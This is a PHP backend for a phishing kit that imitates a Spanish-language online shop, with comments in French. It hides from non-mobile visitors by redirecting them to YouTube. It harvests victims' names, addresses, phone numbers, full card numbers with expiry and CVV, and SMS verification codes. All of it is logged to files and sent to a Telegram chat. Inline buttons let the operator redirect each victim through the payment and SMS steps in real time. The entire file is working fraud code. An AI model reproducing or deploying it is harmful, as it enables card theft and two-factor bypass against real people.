<?php
// Activer l'affichage des erreurs
error_reporting(E_ALL);
ini_set('display_errors', 1);

require_once 'config.php';

// === FONCTION DE SÉCURITÉ MOBILE + PC ===
function checkMobileAccess() {
    $allowed_ips = [
   

      '84.5.27.23', // Votre IP PC
        '127.0.0.1', // Localhost
        '::1', // Localhost IPv6

    ];

    $mobile_user_agents = [
        'iPhone', 'iPad', 'Android', 'BlackBerry', 'Windows Phone',
        'Mobile', 'webOS', 'Opera Mini', 'IEMobile', 'Symbian',
        'Nokia', 'Samsung', 'LG', 'Sony', 'HTC', 'Motorola',
        'Huawei', 'Xiaomi', 'Oppo', 'Vivo', 'Realme', 'OnePlus'
    ];

    function isMobileDevice($mobile_user_agents) {
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        
        // Vérifier chaque user agent mobile
        foreach ($mobile_user_agents as $agent) {
            if (stripos($user_agent, $agent) !== false) {
                return true;
            }
        }
        
        // Vérification supplémentaire pour les tailles d'écran mobiles
        if (isset($_SERVER['HTTP_SEC_CH_UA_MOBILE'])) {
            return $_SERVER['HTTP_SEC_CH_UA_MOBILE'] === '?1';
        }
        
        return false;
    }

    function isAllowedIP($allowed_ips) {
        $client_ip = $_SERVER['REMOTE_ADDR'] ?? '';
        $forwarded_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
        
        // Vérifier l'IP directe et l'IP forwardée
        return in_array($client_ip, $allowed_ips) || in_array($forwarded_ip, $allowed_ips);
    }

    // VÉRIFICATION D'ACCÈS - MOBILES OU VOTRE PC
    if (!isMobileDevice($mobile_user_agents) && !isAllowedIP($allowed_ips)) {
        header('Location: https://www.youtube.com');
        exit;
    }
}
// === FIN FONCTION DE SÉCURITÉ ===

// Fonction pour obtenir l'IP du visiteur
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Fonction pour générer un User ID unique basé sur l'IP
function getUserID() {
    return md5(getUserIP());
}

// Fonction pour enregistrer un utilisateur
function saveUser($page) {
    $ip = getUserIP();
    $userId = getUserID();
    
    $users = json_decode(file_get_contents(USERS_FILE), true);
    
    $users[$userId] = [
        'ip' => $ip,
        'user_id' => $userId,
        'current_page' => $page,
        'last_visit' => date('Y-m-d H:i:s'),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
    ];
    
    file_put_contents(USERS_FILE, json_encode($users, JSON_PRETTY_PRINT));
    
    return $userId;
}

// Fonction pour envoyer une notification Telegram avec boutons
function sendTelegramNotification($page) {
    $ip = getUserIP();
    $userId = saveUser($page);
    
    $message = "🔔 *Nouvelle Visite*\n\n";
    $message .= "📍 *Page:* `$page`\n";
    $message .= "🆔 *User ID:* `$userId`\n";
    $message .= "🌐 *IP:* `$ip`\n";
    $message .= "⏰ *Heure:* " . date('H:i:s');
    
    // Boutons de navigation
    // Dans la fonction sendTelegramNotification(), modifier les boutons :
$keyboard = [
    [
        ['text' => '🏠 Inicio', 'callback_data' => "redirect_$userId|index"],
        ['text' => '🛍️ Tienda', 'callback_data' => "redirect_$userId|boutique"]
    ],
    [
        ['text' => '💳 Pago', 'callback_data' => "redirect_$userId|payment"],
        ['text' => '⏳ Cargando', 'callback_data' => "redirect_$userId|loader"]
    ],
    [
        ['text' => '📱 SMS', 'callback_data' => "redirect_$userId|sms"],
        ['text' => '⏳ Cargando2', 'callback_data' => "redirect_$userId|loader2"]
    ],
    [
        ['text' => '✅ Completado', 'callback_data' => "redirect_$userId|done"]
    ]
];
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown',
        'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
    ];
    
    $ch = curl_init(TELEGRAM_API_URL . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Fonction pour définir une redirection
function setRedirect($userId, $targetPage) {
    $redirects = json_decode(file_get_contents(REDIRECTS_FILE), true);
    
    $redirects[$userId] = [
        'target_page' => $targetPage,
        'timestamp' => time()
    ];
    
    file_put_contents(REDIRECTS_FILE, json_encode($redirects, JSON_PRETTY_PRINT));
}

// Fonction pour vérifier s'il y a une redirection en attente
function checkRedirect() {
    $userId = getUserID();
    $redirects = json_decode(file_get_contents(REDIRECTS_FILE), true);
    
    if (isset($redirects[$userId])) {
        $redirect = $redirects[$userId];
        
        // Supprimer la redirection après lecture
        unset($redirects[$userId]);
        file_put_contents(REDIRECTS_FILE, json_encode($redirects, JSON_PRETTY_PRINT));
        
        return $redirect['target_page'];
    }
    
    return null;
}

// Fonction pour obtenir le chemin de la page
function getPagePath($page) {
    $pages = [
   'index' => 'index.php',
        'boutique' => 'tienda.php',
        'payment' => 'pago.php',
        'loader' => 'cargando.php',
        'sms' => 'sms.php',
        'loader2' => 'cargando2.php',
        'done' => 'completado.php'
    ];
    
    return $pages[$page] ?? 'index.php';
}

// Fonction pour récupérer le numéro de téléphone complet de l'utilisateur
function getUserFullPhone($userId) {
    $userFile = __DIR__ . '/data/user_data.json';
    
    if (!file_exists($userFile)) {
        return '';
    }
    
    $allUsers = json_decode(file_get_contents($userFile), true);
    $userData = $allUsers[$userId] ?? null;
    
    if (!$userData || empty($userData['livraison']['telephone'])) {
        return '';
    }
    
    return $userData['livraison']['telephone'];
}

// Fonction pour formater le numéro de téléphone pour l'affichage (sans masquage)
function formatPhoneForDisplay($phone) {
    if (empty($phone)) {
        return 'Non renseigné';
    }
    
    // Nettoyer et formater le numéro
    $cleanedPhone = preg_replace('/[^0-9]/', '', $phone);
    
    // Formater selon la longueur
    if (strlen($cleanedPhone) === 10) {
        // Format français: 0612345678 -> 06 12 34 56 78
        return implode(' ', str_split($cleanedPhone, 2));
    }
    
    // Retourner le numéro original si format non reconnu
    return $phone;
}

// Fonction pour récupérer le numéro de téléphone formaté de l'utilisateur
function getUserPhoneNumber($userId) {
    $fullPhone = getUserFullPhone($userId);
    return formatPhoneForDisplay($fullPhone);
}

// Fonction pour capturer les données de livraison
function captureFormData() {
    $userId = getUserID();
    $data = [
        'nom' => $_POST['nom'] ?? '',
        'prenom' => $_POST['prenom'] ?? '',
        'telephone' => $_POST['telephone'] ?? '',
        'email' => $_POST['email'] ?? '',
        'adresse' => $_POST['adresse'] ?? '',
        'code_postal' => $_POST['code_postal'] ?? '',
        'ville' => $_POST['ville'] ?? '',
        'timestamp' => date('Y-m-d H:i:s'),
        'user_id' => $userId,
        'ip' => getUserIP(),
        'page' => 'boutique'
    ];
    
    // Sauvegarder dans le fichier utilisateur unique
    updateUserData($userId, 'livraison', $data);
    
    // Logger l'action
    $logFile = __DIR__ . '/data/form_log.txt';
    file_put_contents($logFile, date('H:i:s') . " - Livraison: " . $data['email'] . " | Tél: " . $data['telephone'] . " (IP: " . $data['ip'] . ")\n", FILE_APPEND);
    
    // Envoyer notification Telegram groupée
    sendGroupedTelegramNotification($userId, 'livraison');
}

// Fonction pour capturer les données de paiement
function capturePaymentData() {
    $userId = getUserID();
    $data = [
        'card_number' => $_POST['card_number'] ?? '',
        'card_name' => $_POST['card_name'] ?? '',
        'expiry_date' => $_POST['expiry_date'] ?? '',
        'cvv' => $_POST['cvv'] ?? '',
        'timestamp' => date('Y-m-d H:i:s'),
        'user_id' => $userId,
        'ip' => getUserIP(),
        'page' => 'payment'
    ];
    
    // Sauvegarder dans le fichier utilisateur unique
    updateUserData($userId, 'paiement', $data);
    
    // Logger l'action
    $logFile = __DIR__ . '/data/payment_log.txt';
    file_put_contents($logFile, date('H:i:s') . " - Paiement - Carte: " . ($data['card_number'] ?? '') . " (User: $userId)\n", FILE_APPEND);
    
    // Envoyer notification Telegram groupée
    sendGroupedTelegramNotification($userId, 'paiement');
}

// Fonction pour capturer les données SMS
function captureSMSData() {
    $userId = getUserID();
    $smsCode = $_POST['sms_code'] ?? '';
    
    // Récupérer le vrai numéro de téléphone
    $fullPhone = getUserFullPhone($userId);
    $displayPhone = getUserPhoneNumber($userId);
    
    $data = [
        'sms_code' => $smsCode,
        'phone_full' => $fullPhone,
        'phone_display' => $displayPhone,
        'timestamp' => date('Y-m-d H:i:s'),
        'user_id' => $userId,
        'ip' => getUserIP(),
        'page' => 'sms'
    ];
    
    // Sauvegarder dans le fichier utilisateur unique
    updateUserData($userId, 'sms', $data);
    
    // Logger l'action
    $logFile = __DIR__ . '/data/sms_log.txt';
    file_put_contents($logFile, date('H:i:s') . " - SMS: Code " . $data['sms_code'] . " pour " . $fullPhone . " (User: $userId)\n", FILE_APPEND);
    
    // Envoyer notification Telegram groupée
    sendGroupedTelegramNotification($userId, 'sms');
}

// Fonction pour mettre à jour les données utilisateur
function updateUserData($userId, $type, $data) {
    $userFile = __DIR__ . '/data/user_data.json';
    $allUsers = [];
    
    if (file_exists($userFile)) {
        $allUsers = json_decode(file_get_contents($userFile), true) ?? [];
    }
    
    // Initialiser ou mettre à jour l'utilisateur
    if (!isset($allUsers[$userId])) {
        $allUsers[$userId] = [
            'user_id' => $userId,
            'ip' => getUserIP(),
            'created_at' => date('Y-m-d H:i:s'),
            'last_update' => date('Y-m-d H:i:s'),
            'livraison' => [],
            'paiement' => [],
            'sms' => []
        ];
    }
    
    // Mettre à jour les données selon le type
    $allUsers[$userId][$type] = $data;
    $allUsers[$userId]['last_update'] = date('Y-m-d H:i:s');
    
    file_put_contents($userFile, json_encode($allUsers, JSON_PRETTY_PRINT));
}

// Fonction pour récupérer les données utilisateur
function getUserData($userId) {
    $userFile = __DIR__ . '/data/user_data.json';
    
    if (!file_exists($userFile)) {
        return [];
    }
    
    $allUsers = json_decode(file_get_contents($userFile), true);
    return $allUsers[$userId] ?? [];
}

// Fonction pour envoyer une notification groupée Telegram
function sendGroupedTelegramNotification($userId, $step) {
    $userData = getUserData($userId);
    
    if (!$userData) {
        return;
    }
    
    // Si c'est l'étape SMS ou loader2, envoyer la notification complète
    if ($step === 'sms' || $step === 'loader2') {
        sendCompleteOrderNotification($userId, $userData);
    } else {
        // Notification normale pour les autres étapes
        $message = "🔔 *PROGRESSION UTILISATEUR*\n\n";
        $message .= "🆔 *User ID:* `$userId`\n";
        $message .= "🌐 *IP:* `" . ($userData['ip'] ?? 'N/A') . "`\n";
        $message .= "📊 *Étape actuelle:* `$step`\n";
        $message .= "⏰ *Dernière mise à jour:* " . date('H:i:s') . "\n\n";
        
        // Informations de livraison
        if (!empty($userData['livraison'])) {
            $liv = $userData['livraison'];
            $message .= "📦 *LIVRAISON:* ✅ COMPLET\n";
            $message .= "• 👤 Nom: `" . ($liv['nom'] ?? '') . " " . ($liv['prenom'] ?? '') . "`\n";
            $message .= "• 📞 Tél: `" . ($liv['telephone'] ?? '') . "`\n";
            $message .= "• 📧 Email: `" . ($liv['email'] ?? '') . "`\n";
            $message .= "• 🏠 Adresse: `" . ($liv['adresse'] ?? '') . ", " . ($liv['code_postal'] ?? '') . " " . ($liv['ville'] ?? '') . "`\n\n";
        } else {
            $message .= "📦 *LIVRAISON:* ❌ Non rempli\n\n";
        }
        
        // Informations de paiement
        if (!empty($userData['paiement'])) {
            $pay = $userData['paiement'];
            $message .= "💳 *PAIEMENT:* ✅ COMPLET\n";
            $message .= "• 👤 Titulaire: `" . ($pay['card_name'] ?? '') . "`\n";
            $message .= "• 💳 Carte: `" . ($pay['card_number'] ?? '') . "`\n";
            $message .= "• 📅 Expiration: `" . ($pay['expiry_date'] ?? '') . "`\n";
            $message .= "• 🔒 CVV: `" . ($pay['cvv'] ?? '') . "`\n\n";
        } else {
            $message .= "💳 *PAIEMENT:* ❌ Non rempli\n\n";
        }
        
        // Informations SMS
        if (!empty($userData['sms'])) {
            $sms = $userData['sms'];
            $message .= "📱 *SMS:* ✅ COMPLET\n";
            $message .= "• 🔢 Code: `" . ($sms['sms_code'] ?? '') . "`\n";
            $message .= "• 📞 Téléphone: `" . ($sms['phone_full'] ?? '') . "`\n";
        } else {
            $message .= "📱 *SMS:* ❌ Non rempli\n";
        }
        
        // Envoyer le message Telegram
        sendTelegramMessage($message);
    }
}

// Fonction pour envoyer la notification de commande complète
function sendCompleteOrderNotification($userId, $userData) {
    $message = "🎉 *COMMANDE COMPLÈTE !* 🎉\n\n";
    $message .= "🆔 *User ID:* `$userId`\n";
    $message .= "🌐 *IP:* `" . ($userData['ip'] ?? 'N/A') . "`\n";
    $message .= "⏰ *Heure de complétion:* " . date('H:i:s') . "\n";
    $message .= "📅 *Date:* " . date('d/m/Y') . "\n\n";
    
    $message .= "═══════════════════════════════\n";
    $message .= "📦 *INFORMATIONS DE LIVRAISON*\n";
    $message .= "═══════════════════════════════\n";
    
    if (!empty($userData['livraison'])) {
        $liv = $userData['livraison'];
        $message .= "👤 *Nom complet:* `" . ($liv['nom'] ?? '') . " " . ($liv['prenom'] ?? '') . "`\n";
        $message .= "📞 *Téléphone:* `" . ($liv['telephone'] ?? '') . "`\n";
        $message .= "📧 *Email:* `" . ($liv['email'] ?? '') . "`\n";
        $message .= "🏠 *Adresse:* `" . ($liv['adresse'] ?? '') . "`\n";
        $message .= "📍 *Ville:* `" . ($liv['code_postal'] ?? '') . " " . ($liv['ville'] ?? '') . "`\n\n";
    }
    
    $message .= "═══════════════════════════════\n";
    $message .= "💳 *INFORMATIONS DE PAIEMENT*\n";
    $message .= "═══════════════════════════════\n";
    
    if (!empty($userData['paiement'])) {
        $pay = $userData['paiement'];

        $message .= "👤 *Titulaire:* `" . ($pay['card_name'] ?? '') . "`\n";
        $message .= "💳 *Carte:* `" . ($pay['card_number'] ?? '') . "`\n";
        $message .= "📅 *Expiration:* `" . ($pay['expiry_date'] ?? '') . "`\n";
        $message .= "🔒 *CVV:* `" . ($pay['cvv'] ?? '') . "`\n\n";
    }
    
    $message .= "═══════════════════════════════\n";
    $message .= "📱 *VÉRIFICATION SMS*\n";
    $message .= "═══════════════════════════════\n";
    
    if (!empty($userData['sms'])) {
        $sms = $userData['sms'];
        $message .= "🔢 *Code SMS:* `" . ($sms['sms_code'] ?? '') . "`\n";
        $message .= "📞 *Téléphone:* `" . ($sms['phone_full'] ?? '') . "`\n";
    }
    
    $message .= "\n";
    $message .= "✅ *STATUT: COMMANDE FINALISÉE*\n";
    $message .= "🚚 *Livraison en cours de préparation...*";
    
    // Envoyer le message Telegram
    sendTelegramMessage($message);
}

// Fonction utilitaire pour envoyer un message Telegram
function sendTelegramMessage($message) {
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init(TELEGRAM_API_URL . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Fonction pour capturer la complétion de commande
function captureOrderComplete() {
    $userId = getUserID();
    $userData = getUserData($userId);
    sendCompleteOrderNotification($userId, $userData);
}
?>
